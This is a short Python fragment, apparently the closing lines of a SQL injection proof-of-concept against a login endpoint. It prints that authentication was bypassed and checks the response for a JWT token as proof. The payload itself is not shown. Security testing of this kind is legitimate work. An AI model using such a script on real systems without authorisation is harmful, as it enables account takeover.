        print("PROOF: SQL Injection successful - authentication bypassed!")
        # Try to extract some information from the response
        try:
            json_response = response.json()
            if 'token' in json_response:
                print("JWT token obtained, confirming successful login bypass")
        except:
            pass
except Exception as e:
    print(f"Error: {e}")
